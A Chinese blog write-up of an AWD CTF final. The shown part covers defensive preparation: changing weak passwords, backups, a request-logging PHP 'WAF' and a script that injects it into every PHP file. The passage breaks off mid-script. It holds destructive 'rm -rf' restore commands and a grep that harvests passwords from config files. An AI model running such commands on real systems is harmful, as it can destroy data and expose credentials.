<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <meta charset="utf-8">
<title>Xman结营赛AWD总结 - cjM00N&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">












<link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.8.0/css/bulma.min.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/atom-one-light.min.css">


<link rel="stylesheet" href="/css/style.css">


<script defer src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js" integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0=" crossorigin="anonymous"></script>


    
    
    
    
    
    
    
    
    
    

    


<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/rss.xml" title="cjM00N's blog" type="application/atom+xml">
</head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png" alt="" height="28">
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">Archives</a>
            
            <a class="navbar-item "
               href="/categories">Categories</a>
            
            <a class="navbar-item "
               href="/tags">Tags</a>
            
            <a class="navbar-item "
               href="/friends">Friends</a>
            
            <a class="navbar-item "
               href="/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="搜索" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目录">
                    <i class="fa fa-list"></i>
                </a>
                <div class="navbar-dropdown is-right">
                    
                    
                    
                    
                    <a class="navbar-item" href="#准备">1&nbsp;&nbsp;<b>准备</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#文件交流">1.1&nbsp;&nbsp;文件交流</a>
                    
                    
                    
                    <a class="navbar-item" href="#文档交流">1.2&nbsp;&nbsp;文档交流</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#比赛">2&nbsp;&nbsp;<b>比赛</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#登录">2.1&nbsp;&nbsp;登录</a>
                    
                    
                    
                    <a class="navbar-item" href="#弱密码">2.2&nbsp;&nbsp;弱密码</a>
                    
                    
                    
                    <a class="navbar-item" href="#ssh">2.2.1&nbsp;&nbsp;ssh</a>
                    
                    
                    
                    <a class="navbar-item" href="#数据库">2.2.2&nbsp;&nbsp;数据库</a>
                    
                    
                    
                    <a class="navbar-item" href="#备份">2.3&nbsp;&nbsp;备份</a>
                    
                    
                    
                    <a class="navbar-item" href="#源码备份">2.3.1&nbsp;&nbsp;源码备份</a>
                    
                    
                    
                    <a class="navbar-item" href="#数据库备份">2.3.2&nbsp;&nbsp;数据库备份</a>
                    
                    
                    
                    <a class="navbar-item" href="#上waf">2.4&nbsp;&nbsp;上waf</a>
                    
                    
                    
                    <a class="navbar-item" href="#流量监控">2.4.1&nbsp;&nbsp;流量监控</a>
                    
                    
                    
                    <a class="navbar-item" href="#文件监控">2.4.2&nbsp;&nbsp;文件监控</a>
                    
                    
                    
                    <a class="navbar-item" href="#扫后门">2.5&nbsp;&nbsp;扫后门</a>
                    
                    
                    
                    <a class="navbar-item" href="#流量分析">2.6&nbsp;&nbsp;流量分析</a>
                    
                    
                    
                    <a class="navbar-item" href="#wireshark">2.6.1&nbsp;&nbsp;wireshark</a>
                    
                    
                    
                    <a class="navbar-item" href="#log记录">2.6.2&nbsp;&nbsp;log记录</a>
                    
                    
                    
                    <a class="navbar-item" href="#快速攻击">2.7&nbsp;&nbsp;快速攻击</a>
                    
                    
                    
                    <a class="navbar-item" href="#全场攻击">2.8&nbsp;&nbsp;全场攻击</a>
                    
                    
                    
                    <a class="navbar-item" href="#不死马与杀马">2.9&nbsp;&nbsp;不死马与杀马</a>
                    
                    
                    
                    <a class="navbar-item" href="#定时任务">2.10&nbsp;&nbsp;定时任务</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#总结">3&nbsp;&nbsp;<b>总结</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#参考链接">4&nbsp;&nbsp;<b>参考链接</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" title="GitHub" href="https://github.com/cjm00n/" target="_blank" rel="noopener">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            <a class="navbar-item" title="RSS" href="/rss.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
        Xman结营赛AWD总结
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <i class="far fa-clock"></i>&nbsp;
            
            
            <time datetime="2019-12-25T14:34:00.088Z"
                itemprop="datePublished">12月 25 2019</time>更新&nbsp;
            

            
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/CTF/">CTF</a>
        </span>
        
        
        <span class="column is-narrow article-category">
            <i class="fab fa-hotjar" style="color: #E74C3C;"></i>&nbsp;&nbsp;热度: <span class="leancloud-counter" data-leancloud-counter-url="/2019/08/22/Xman结营赛AWD总结/" data-leancloud-counter-inc></span><script>
var LeanCounter=function(){"use strict";function t(t){void 0===t&&(t={});var e=t.appId,n=t.appKey,r=t.elementClass;void 0===r&&(r=".leancloud-counter");var i=t.addCountInterval;void 0===i&&(i=100);var a=t.base;void 0===a&&(a="/1.1/classes/Counter");var o=t.initOnLoaded;if(void 0===o&&(o=!0),!e||!n)throw new Error("Missing appId or appKey.");this._appId=e,this._appKey=n,this._idCache={},this._addCountUrlQueue=[],this.addCountInterval=i,this.base=a,this.elements=document.querySelectorAll(r),o&&("loading"!==document.readyState?this.init():document.addEventListener("DOMContentLoaded",this.init.bind(this)))}return t.prototype._request=function(t,e,n){if(!this.apiServer)return Promise.reject(new Error("This LeanCounter instance is not initialized."));if("get"===t){var r="https://"+this.apiServer+this.base+e;if(n){var i=[];Object.keys(n).forEach(function(t){i.push(t+"="+encodeURI(n[t]))}),r+="?"+i.join("&")}return fetch(r,{headers:{"Content-Type":"application/json","X-LC-Id":this._appId,"X-LC-Key":this._appKey}}).then(function(t){return t.json()})}return fetch("https://"+this.apiServer+this.base+e,{method:t,headers:{"Content-Type":"application/json","X-LC-Id":this._appId,"X-LC-Key":this._appKey},body:JSON.stringify(n)}).then(function(t){return t.json()})},t.prototype.getCount=function(t){var e,n,r=this,i=t;return Array.isArray(i)||(i=Array(i)),e=[],n={},i.forEach(function(t){n[t]||(e.push(t),n[t]=!0)}),i=e,this._request("get","",{where:JSON.stringify({url:{$in:i}})}).then(function(t){var e=t.results,n={};return e.forEach(function(t){var e=t.url,i=t.objectId,a=t.time;r._idCache[e]||(r._idCache[e]=i),n[e]=a}),n})},t.prototype.addCount=function(t){var e=this;this._addCountUrlQueue.push(t),this._addCountIntervalId||(this._addCountIntervalId=setInterval(function(){if(0!==e._addCountUrlQueue.length){var t=e._addCountUrlQueue.pop();e._idCache[t]||e.getCount(t),e._request("put","/"+e._idCache[t],{time:{__op:"Increment",amount:1}})}},this.addCountInterval))},t.prototype.init=function(){var t=this;fetch("https://app-router.leancloud.cn/2/route?appId="+this._appId).then(function(t){return t.json()}).then(function(e){var n=e.api_server;t.apiServer=n;var r=[];return t.elements.forEach(function(t){r.push(t.dataset.leancloudCounterUrl)}),t.getCount(r)}).then(function(e){t.elements.forEach(function(n){"leancloudCounterInc"in n.dataset?(n.textContent=String(e[n.dataset.leancloudCounterUrl]+1),t.addCount(n.dataset.leancloudCounterUrl)):n.textContent=String(e[n.dataset.leancloudCounterUrl])})})},t}();

var leanCounter = new LeanCounter({
  appId: 'KnWlaUsawT6Pf6rwNLVJpt08-gzGzoHsz',
  appKey: 'HbSKKwFRuQ2jzyC1caWF8X5Y',
});
</script> ℃
        </span>
        
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
        
        <html><head></head><body><p>Xman20天结束了, 感谢各路大佬抬我一手, 第二次打AWD, 虽然还是很菜, 但总不至于毫无输出了, 膜一波@q4n和@Cosmos, 由于总结的时候已经过去两天了, 当时的图都没留下来, 很多地方大家就意会一下吧<br>我还是觉得这个赛制很神奇, 竟然有可以打自己出的题的比赛</p>
<a id="more"></a>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822111304.png" alt></p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>还是太浪了, 结营赛前一天才开始准备, 本来想上@王一航师傅的框架 <a href="https://github.com/SniperOJ/Attack-Defense-Framework/tree/v2" target="_blank" rel="noopener">AWD Framework</a> , 但是准备的比较晚没搞懂,  就还是上网找了散装脚本用了, 后面会把用到的脚本罗列一下</p>
<p>比赛前一晚还搭好了<code>hackmd</code>, 但是没有整明白虚拟机的网络配置..只能我自己连上去, 导致比赛的过程交流都是物理交流了hhhh</p>
<h3 id="文件交流"><a href="#文件交流" class="headerlink" title="文件交流"></a>文件交流</h3><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># python2</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line"># python3</span><br><span class="line">python -m http.server 8000</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="文档交流"><a href="#文档交流" class="headerlink" title="文档交流"></a>文档交流</h3><p>推荐使用<code>codimd</code></p>
<p>搭建方法参考 <a href="https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment" target="_blank" rel="noopener">https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment</a></p>
<p>装好了docker和docker-compose只需要三行命令</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/hackmdio/docker-hackmd.git</span><br><span class="line">cd docker-hackmd</span><br><span class="line">docker-compose up</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后访问<code>localhost:3000</code>即可</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822134431.png" alt></p>
<p>图片上传的部分需要进去docker里面修改一下, 默认是imgur图床</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 进入容器, 需要对应containerid</span><br><span class="line">docker exec -it containerid /bin/bash</span><br><span class="line"># 安装vim</span><br><span class="line">apt update && apt install vim</span><br><span class="line"># 修改</span><br><span class="line">vim config.json</span><br><span class="line">#修改imageuploadtype为filesystem</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后就可以正常传图片了</p>
<p>虚拟机的网络设置需要改成桥接模式, 这样才能和主机在同一个段, 局域网内可以正常访问</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822162848.png" alt></p>
<h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>比赛开始的时候发了账号密码, 登录上去一直看不到赛题信息, 还以为是网络问题, 后面问了才发现是<strong>广告插件的问题</strong> , 关闭广告插件就可以看到了</p>
<ul>
<li><strong>关闭广告拦截插件</strong></li>
</ul>
<p>然后下载赛题信息, 里面有ip和ssh的公私钥</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822112558.png" alt></p>
<p>第一次连, 差点不会连, 还好<code>MobaXTerm</code>的界面设计的不错, 一眼就看到了在哪里添加</p>
<ul>
<li>输入host和username(这里是xman)</li>
<li>勾选 Use private Key</li>
<li>选择不带后缀的私钥 id_rsa</li>
</ul>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822112853.png" alt></p>
<p>然后就可以登录上去了</p>
<h3 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h3><p>这里主要涉及的是</p>
<ul>
<li>ssh密码</li>
<li>mysql密码</li>
<li>phpmyadmin密码</li>
<li>etc</li>
</ul>
<p>不过这部分暂时还没找到相关的脚本, 师傅们有的话可以来交流一下</p>
<h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>先登录上去, 之后</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>输入密码即可, 改完自己的直接开始打</p>
<p>这里可以用@p0desta师傅的框架 <a href="https://github.com/P0desta/awd-attack" target="_blank" rel="noopener">awd-attack</a></p>
<p>不过没有集成修改ssh密码的功能, 后面再自己改一下吧</p>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql>set password=password('new');</span><br><span class="line">mysql>flush privileges;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>没改的话上去就可以删库跑路了hhh</p>
<h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>备份还是大意了, 比赛前想过备份数据库, 连命令都准备好了, 结果上去就忘记了, 导致web9从开始就宕机宕到结束</p>
<p>(自己背锅</p>
<p>下面的备份都是备份到家目录</p>
<h4 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h4><p>这里有个注意的点是, 如果不先进入html文件夹的话, 备份后的压缩包会包含整个路径</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 不建议</span></span><br><span class="line">tar -zcvf ~/html.tar.gz /var/www/html/</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822115135.png" alt></p>
<p>下面的命令压缩后结构如下</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822115116.png" alt></p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> /var/www/html</span><br><span class="line">tar -zcvf ~/html.tar.gz *</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>如果需要恢复则可以使用下面的命令</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /var/www/html</span><br><span class="line">tar -zxvf ~/html.tar.gz -C /var/www/html</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>或者</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> /var/www/html</span><br><span class="line">rm -rf *</span><br><span class="line">tar -zxvf ~/html.tar.gz</span><br></pre></td></tr></tbody></table></figure><p></p>
<h4 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h4><p>先在html文件夹里面搜索一下数据库的用户名和密码</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line">find .|xargs grep "password"</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>, 然后开始备份</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#mysql终端下可以先看一下有什么数据库</span><br><span class="line">mysql>show databases;</span><br><span class="line"># 备份相应的数据库</span><br><span class="line">mysqldump -u 用户名 -p 数据库名>~/back.sql</span><br><span class="line"># 备份全部数据库</span><br><span class="line">mysqldump -u root -p --all-databases >~/back.sql</span><br><span class="line"># 跳过锁定的数据库表</span><br><span class="line">mysqldump -u root -p --all-databases —skip-lock-tables >~/back.sql</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>恢复的话, 需要先建好相应的数据库</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd </span><br><span class="line">mysql>create database xxx;</span><br><span class="line">mysql>use xxx;</span><br><span class="line">mysql>source back.sql;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>或者在终端下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br><span class="line">mysql -u root -p xxx<back.sql</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="上waf"><a href="#上waf" class="headerlink" title="上waf"></a>上waf</h3><p>waf, 也就是通用防御, 可以用的一般有下面两种</p>
<ul>
<li>流量监控, 必上</li>
<li>文件监控, 看情况</li>
</ul>
<p>至于其他的骚套路, 像流量转发, iptables等等这些有一定的风险, 可能会被举报, 不建议</p>
<h4 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h4><p>重要, 必须上, 流量相当于我们的眼睛, 没有流量只能被动挨打, 有了流量才可以抄作业hhhh</p>
<p>这里贴一下@郁离歌师傅的waf</p>
<p>不过这次结营赛官方提供了pcap流量包, 后面会提到</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>); </span><br><span class="line">define(‘LOG_FILEDIR’,’/tmp’); </span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span><span class="hljs-params">()</span> </span></span><br><span class="line"><span class="hljs-function"></span>{ </span><br><span class="line"><span class="hljs-keyword">if</span> (!function_exists(‘getallheaders’)) { </span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span><span class="hljs-params">()</span> </span>{ </span><br><span class="line"><span class="hljs-keyword">foreach</span> ($_SERVER <span class="hljs-keyword">as</span> $name => $value) { </span><br><span class="line"><span class="hljs-keyword">if</span> (substr($name, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == ‘HTTP_’) </span><br><span class="line">$headers[str_replace(‘ ‘, ‘-‘, ucwords(strtolower(str_replace(‘_’, ‘ ‘, substr($name, <span class="hljs-number">5</span>)))))] = $value; </span><br><span class="line">} </span><br><span class="line"><span class="hljs-keyword">return</span> $headers; </span><br><span class="line">} </span><br><span class="line">} </span><br><span class="line">$get = $_GET; </span><br><span class="line">$post = $_POST; </span><br><span class="line">$cookie = $_COOKIE; </span><br><span class="line">$header = getallheaders(); </span><br><span class="line">$files = $_FILES; </span><br><span class="line">$ip = $_SERVER[“REMOTE_ADDR”]; </span><br><span class="line">$method = $_SERVER[‘REQUEST_METHOD’]; </span><br><span class="line">$filepath = $_SERVER[“SCRIPT_NAME”]; </span><br><span class="line"><span class="hljs-keyword">foreach</span> ($_FILES <span class="hljs-keyword">as</span> $key => $value) { </span><br><span class="line">$files[$key][‘content’] = file_get_contents($_FILES[$key][‘tmp_name’]); </span><br><span class="line">file_put_contents($_FILES[$key][‘tmp_name’], “virink”); </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">unset</span>($header[‘Accept’]);</span><br><span class="line">$input = <span class="hljs-keyword">array</span>(“Get”=>$get, “Post”=>$post, “Cookie”=>$cookie, “File”=>$files, “Header”=>$header);</span><br><span class="line"></span><br><span class="line">logging($input);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logging</span><span class="hljs-params">($var)</span></span>{ </span><br><span class="line">$filename = $_SERVER[‘REMOTE_ADDR’];</span><br><span class="line">$LOG_FILENAME = LOG_FILEDIR.”/”.$filename;</span><br><span class="line">$time = date(“Y-m-d G:i:s”);</span><br><span class="line">file_put_contents($LOG_FILENAME, “\r\n”.$time.”\r\n”.print_r($var, <span class="hljs-keyword">true</span>), FILE_APPEND); </span><br><span class="line">file_put_contents($LOG_FILENAME,”\r\n”.’http:<span class="hljs-comment">//’.$_SERVER[‘HTTP_HOST’].$_SERVER[‘PHP_SELF’].’?’.$_SERVER[‘QUERY_STRING’], FILE_APPEND);</span></span><br><span class="line">file_put_contents($LOG_FILENAME,”\r\n***************************************************************”,FILE_APPEND);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">waf(); </span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>自动上waf的脚本, 这个脚本需要注意的是, waf的路径必须是绝对路径, 因为是递归添加waf, 如果不是绝对路径, 内层文件夹的php文件无法找到waf的路径, 服务就会宕掉, 但是如果全部上的话, 就算上对了还是有可能出现宕机, 这个与namespace有关, 可以了解一下, 如果是常见的cms可以上在入口的php中, 就能监听到流量了</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">批量添加WAF的python脚本</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line">base_dir = <span class="hljs-string">'/var/www/html'</span> <span class="hljs-comment">#web path</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scandir</span><span class="hljs-params">(startdir)</span> :</span></span><br><span class="line">    </span><br><span class="line">    os.chdir(startdir)</span><br><span class="line">    <span class="hljs-keyword">for</span> obj <span class="hljs-keyword">in</span> os.listdir(os.curdir) :</span><br><span class="line">        path = os.getcwd() + os.sep + obj</span><br><span class="line">        <span class="hljs-keyword">if</span> os.path.isfile(path) <span class="hljs-keyword">and</span> <span class="hljs-string">'.php'</span> <span class="hljs-keyword">in</span> obj <span class="hljs-keyword">and</span> <span class="hljs-string">'log'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> path:</span><br><span class="line">        	modifyip(path,<span class="hljs-string">'<?php'</span>,<span class="hljs-string">'<?php\nrequire_once(\'/var/www/html/log.php\');'</span>) </span><br><span class="line">        <span class="hljs-keyword">if</span> os.path.isdir(obj) :</span><br><span class="line">            scandir(obj)</span><br><span class="line">            os.chdir(os.pardir) </span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modifyip</span><span class="hljs-params">(tfile,sstr,rstr)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        lines=open(tfile,<span class="hljs-string">'r'</span>).readlines()</span><br><span class="line">        flen=len(lines)<span class="hljs-number">-1</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(flen):</span><br><span class="line">            <span class="hljs-keyword">if</span> sstr <span class="hljs-keyword">in</span> lines[i]:</span><br><span class="line">                lines[i]=lines[i].replace(sstr,rstr)</span><br><span class="line">        open(tfile,<span class="hljs-string">'w'</span>).writelines(lines)</span><br><span class="line">        </span><br><span class="line">    <span class="hljs-keyword">except</span> Exception,e:</span><br><span class="line">        <span class="hljs-keyword">print</span> e</span><br><span class="line">        </span><br><span class="line">scandir(base_dir)</span><br></pre></td></tr></tbody></table></figure><p></p>
<h4 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h4><p>这个的话要看情况, 如果check会检查是否能正常上传文件的话, 这个一上就宕机, 但是有时候check没有检查的话, 就可以上一下, 避免被写马</p>
<p>主要使用的时候修改里面的<code>Special_string</code>字段</p>
<p>然后在自己修改文件的时候只需要在里面加入这个字段即可, 例如</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi index.php</span><br><span class="line">....</span><br><span class="line"># cjM00N</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这样就可以绕过文件监控了</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 